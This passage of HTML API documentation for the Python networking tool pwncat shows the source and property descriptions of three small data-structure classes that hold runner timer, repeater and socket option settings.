        <span class="hljs-keyword">return</span> self.__kwargs

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        action,  <span class="hljs-comment"># type: Callable[..., None]</span>
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        repeat,  <span class="hljs-comment"># type: int</span>
        pause,  <span class="hljs-comment"># type: float</span>
        args,  <span class="hljs-comment"># type: Tuple[Any, ...]</span>
        kwargs,  <span class="hljs-comment"># type: Dict[str, Any]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(repeat) <span class="hljs-keyword">is</span> int, type(repeat)
        <span class="hljs-keyword">assert</span> type(pause) <span class="hljs-keyword">is</span> float, type(pause)
        <span class="hljs-keyword">assert</span> type(kwargs) <span class="hljs-keyword">is</span> dict, type(kwargs)
        self.__action = action
        self.__ssig = ssig
        self.__repeat = repeat
        self.__pause = pause
        self.__args = args
        self.__kwargs = kwargs</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsRunnerRepeater.action"><code class="name">var <span
                                class="ident">action</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>Callable[, None]</code>: function to be run
                                periodically.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">action</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Callable[..., None]</span>
    <span class="hljs-string">"""`Callable[..., None]`: function to be run periodically."""</span>
    <span class="hljs-keyword">return</span> self.__action</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerRepeater.args"><code class="name">var <span
                                class="ident">args</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>*args</code>: optional *args for the action
                                function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Tuple[Any, ...]</span>
    <span class="hljs-string">"""`*args`: optional *args for the action function."""</span>
    <span class="hljs-keyword">return</span> self.__args</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerRepeater.kwargs"><code class="name">var <span
                                class="ident">kwargs</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>**kargs</code>: optional *kwargs for the
                                action function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">kwargs</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Dict[str, Any]</span>
    <span class="hljs-string">"""`**kargs`: optional *kwargs for the action function."""</span>
    <span class="hljs-keyword">return</span> self.__kwargs</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerRepeater.pause"><code class="name">var <span
                                class="ident">pause</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: pause in seconds between repeated
                                action calls.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">pause</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; float</span>
    <span class="hljs-string">"""`int`: pause in seconds between repeated action calls."""</span>
    <span class="hljs-keyword">return</span> self.__pause</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerRepeater.repeat"><code class="name">var <span
                                class="ident">repeat</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: how many times to repeat the
                                action function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">repeat</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: how many times to repeat the action function."""</span>
    <span class="hljs-keyword">return</span> self.__repeat</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerRepeater.ssig"><code class="name">var <span
                                class="ident">ssig</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>:
                                InterruptHandler instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
    <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
    <span class="hljs-keyword">return</span> self.__ssig</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsRunnerTimer"><code class="flex name class">
                    <span>class <span class="ident">DsRunnerTimer</span></span>
                    <span>(</span><span>action, ssig, intvl, args, kwargs)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for Timer functions for the
                        Runner class.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsRunnerTimer</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for Timer functions for the Runner class."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">action</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[..., None]</span>
        <span class="hljs-string">"""`Callable[..., None]`: function to be run periodically."""</span>
        <span class="hljs-keyword">return</span> self.__action

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">intvl</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: interval at which to run the action function.."""</span>
        <span class="hljs-keyword">return</span> self.__intvl

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Tuple[Any, ...]</span>
        <span class="hljs-string">"""`*args`: optional *args for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__args

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kwargs</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Dict[str, Any]</span>
        <span class="hljs-string">"""`**kargs`: optional *kwargs for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__kwargs

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        action,  <span class="hljs-comment"># type: Callable[..., None]</span>
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        intvl,  <span class="hljs-comment"># type: int</span>
        args,  <span class="hljs-comment"># type: Tuple[Any, ...]</span>
        kwargs,  <span class="hljs-comment"># type: Dict[str, Any]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(intvl) <span class="hljs-keyword">is</span> int, type(intvl)
        <span class="hljs-keyword">assert</span> type(kwargs) <span class="hljs-keyword">is</span> dict, type(kwargs)
        self.__action = action
        self.__ssig = ssig
        self.__intvl = intvl
        self.__args = args
        self.__kwargs = kwargs</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsRunnerTimer.action"><code class="name">var <span
                                class="ident">action</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>Callable[, None]</code>: function to be run
                                periodically.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">action</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Callable[..., None]</span>
    <span class="hljs-string">"""`Callable[..., None]`: function to be run periodically."""</span>
    <span class="hljs-keyword">return</span> self.__action</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerTimer.args"><code class="name">var <span
                                class="ident">args</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>*args</code>: optional *args for the action
                                function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Tuple[Any, ...]</span>
    <span class="hljs-string">"""`*args`: optional *args for the action function."""</span>
    <span class="hljs-keyword">return</span> self.__args</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerTimer.intvl"><code class="name">var <span
                                class="ident">intvl</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: interval at which to run the
                                action function..</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">intvl</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: interval at which to run the action function.."""</span>
    <span class="hljs-keyword">return</span> self.__intvl</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerTimer.kwargs"><code class="name">var <span
                                class="ident">kwargs</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>**kargs</code>: optional *kwargs for the
                                action function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">kwargs</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Dict[str, Any]</span>
    <span class="hljs-string">"""`**kargs`: optional *kwargs for the action function."""</span>
    <span class="hljs-keyword">return</span> self.__kwargs</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerTimer.ssig"><code class="name">var <span
                                class="ident">ssig</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>:
                                InterruptHandler instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
    <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
    <span class="hljs-keyword">return</span> self.__ssig</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsSock"><code class="flex name class">
                    <span>class <span class="ident">DsSock</span></span>
                    <span>(</span><span>bufsize, backlog, recv_timeout, nodns, ipv4, ipv6, src_addr, src_port, udp, udp_sconnect, udp_sconnect_word, ip_tos, info)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for DsSock options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">DsSock</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for DsSock options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bufsize</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: Receive buffer size."""</span>
        <span class="hljs-keyword">return</span> self.__bufsize

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backlog</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: Listen backlog."""</span>
        <span class="hljs-keyword">return</span> self.__backlog

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_timeout</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[float]</span>
        <span class="hljs-string">"""`float` or `None`: Receive timeout to change blocking socket to time-out based."""</span>
        <span class="hljs-keyword">return</span> self.__recv_timeout

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">nodns</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if we resolve hostnames or not."""</span>
        <span class="hljs-keyword">return</span> self.__nodns

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ipv4</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Only use IPv4 instead of both, IPv4 and IPv6."""</span>
        <span class="hljs-keyword">return</span> self.__ipv4

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ipv6</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Only use IPv6 instead of both, IPv4 and IPv6."""</span>
        <span class="hljs-keyword">return</span> self.__ipv6

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">src_addr</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`bool`: Custom source address for connect mode."""</span>
        <span class="hljs-keyword">return</span> self.__src_addr

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">src_port</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[int]</span>
        <span class="hljs-string">"""`bool`: Custom source port for connect mode."""</span>
        <span class="hljs-keyword">return</span> self.__src_port

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">udp</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if we use TCP or UDP."""</span>
        <span class="hljs-keyword">return</span> self.__udp

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_sconnect</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if we use stateful connect for UDP."""</span>
        <span class="hljs-keyword">return</span> self.__udp_sconnect

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_sconnect_word</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""`str`: What string to send when emulating a stateful UDP connect."""</span>
        <span class="hljs-keyword">return</span> self.__udp_sconnect_word

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ip_tos</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`str`: Determines what IP_TOS (Type of Service) value to set for the socket."""</span>
        <span class="hljs-keyword">return</span> self.__ip_tos

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">info</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`str`: Determines what info to display about the socket connection."""</span>
        <span class="hljs-keyword">return</span> self.__info

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        bufsize,  <span class="hljs-comment"># type: int</span>
        backlog,  <span class="hljs-comment"># type: int</span>
        recv_timeout,  <span class="hljs-comment"># type: Optional[float]</span>
        nodns,  <span class="hljs-comment"># type: bool</span>
        ipv4,  <span class="hljs-comment"># type: bool</span>
        ipv6,  <span class="hljs-comment"># type: bool</span>
        src_addr,  <span class="hljs-comment"># type: Optional[str]</span>
        src_port,  <span class="hljs-comment"># type: Optional[int]</span>
        udp,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect_word,  <span class="hljs-comment"># type: str</span>
        ip_tos,  <span class="hljs-comment"># type: Optional[str]</span>
        info,  <span class="hljs-comment"># type: str</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(bufsize) <span class="hljs-keyword">is</span> int, type(bufsize)
        <span class="hljs-keyword">assert</span> type(backlog) <span class="hljs-keyword">is</span> int, type(backlog)
        <span class="hljs-keyword">assert</span> type(recv_timeout) <span
                                    class="hljs-keyword">is</span> float, type(recv_timeout)
        <span class="hljs-keyword">assert</span> type(nodns) <span class="hljs-keyword">is</span> bool, type(nodns)
        <span class="hljs-keyword">assert</span> type(ipv4) <span class="hljs-keyword">is</span> bool, type(ipv4)
        <span class="hljs-keyword">assert</span> type(ipv6) <span class="hljs-keyword">is</span> bool, type(ipv6)
        <span class="hljs-keyword">assert</span> type(src_addr) <span class="hljs-keyword">is</span> str <span
                                    class="hljs-keyword">or</span> src_addr <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>, type(src_addr)
        <span class="hljs-keyword">assert</span> type(src_port) <span class="hljs-keyword">is</span> int <span
                                    class="hljs-keyword">or</span> src_port <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>, type(src_port)
        <span class="hljs-keyword">assert</span> type(udp) <span class="hljs-keyword">is</span> bool, type(udp)
        self.__bufsize = bufsize
        self.__backlog = backlog
        self.__recv_timeout = recv_timeout
        self.__nodns = nodns
        self.__ipv4 = ipv4
        self.__ipv6 = ipv6
        self.__src_addr = src_addr
        self.__src_port = src_port
        self.__udp = udp
        self.__udp_sconnect = udp_sconnect
        self.__udp_sconnect_word = udp_sconnect_word
        self.__ip_tos = ip_tos
        self.__info = info</code></pre>
                    </details>
                    <h3>Subclasses</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.DsIONetworkSock"
                               title="pwncat.DsIONetworkSock">DsIONetworkSock</a>
                        </li>
                    </ul>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsSock.backlog"><code class="name">var <span class="ident">backlog</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: Listen backlog.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">backlog</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: Listen backlog."""</span>
    <span class="hljs-keyword">return</span> self.__backlog</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.bufsize"><code class="name">var <span class="ident">bufsize</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: Receive buffer size.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">bufsize</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: Receive buffer size."""</span>
    <span class="hljs-keyword">return</span> self.__bufsize</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.info"><code class="name">var <span
                                class="ident">info</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>str</code>: Determines what info to display
                                about the socket connection.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">info</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
    <span class="hljs-string">"""`str`: Determines what info to display about the socket connection."""</span>
    <span class="hljs-keyword">return</span> self.__info</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.ip_tos"><code class="name">var <span class="ident">ip_tos</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>str</code>: Determines what IP_TOS (Type of
                                Service) value to set for the socket.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ip_tos</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
    <span class="hljs-string">"""`str`: Determines what IP_TOS (Type of Service) value to set for the socket."""</span>
    <span class="hljs-keyword">return</span> self.__ip_tos</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.ipv4"><code class="name">var <span
                                class="ident">ipv4</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Only use IPv4 instead of both,
                                IPv4 and IPv6.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ipv4</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Only use IPv4 instead of both, IPv4 and IPv6."""</span>
    <span class="hljs-keyword">return</span> self.__ipv4</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.ipv6"><code class="name">var <span
                                class="ident">ipv6</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Only use IPv6 instead of both,
                                IPv4 and IPv6.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">ipv6</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Only use IPv6 instead of both, IPv4 and IPv6."""</span>
    <span class="hljs-keyword">return</span> self.__ipv6</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.nodns"><code class="name">var <span class="ident">nodns</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Determines if we resolve
                                hostnames or not.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">nodns</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Determines if we resolve hostnames or not."""</span>
    <span class="hljs-keyword">return</span> self.__nodns</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.recv_timeout"><code class="name">var <span
                                class="ident">recv_timeout</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>float</code> or <code>None</code>: Receive
                                timeout to change blocking socket to time-out based.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_timeout</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[float]</span>
    <span class="hljs-string">"""`float` or `None`: Receive timeout to change blocking socket to time-out based."""</span>
    <span class="hljs-keyword">return</span> self.__recv_timeout</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.src_addr"><code class="name">var <span class="ident">src_addr</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Custom source address for
                                connect mode.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">src_addr</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
    <span class="hljs-string">"""`bool`: Custom source address for connect mode."""</span>
    <span class="hljs-keyword">return</span> self.__src_addr</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.src_port"><code class="name">var <span class="ident">src_port</span></code>
                        </dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Custom source port for connect
                                mode.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">src_port</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[int]</span>
    <span class="hljs-string">"""`bool`: Custom source port for connect mode."""</span>
    <span class="hljs-keyword">return</span> self.__src_port</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.udp"><code class="name">var <span
                                class="ident">udp</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Determines if we use TCP or UDP.
                            </p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">udp</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Determines if we use TCP or UDP."""</span>
    <span class="hljs-keyword">return</span> self.__udp</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsSock.udp_sconnect"><code class="name">var <span
                                class="ident">udp_sconnect</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Determines if we use stateful
                                connect for UDP.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_sconnect</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Determines if we use stateful connect for UDP."""</span>
    <span class="hljs-keyword">return</span> self.__udp_sconnect</code></pre>
                            </details>
                        </dd>
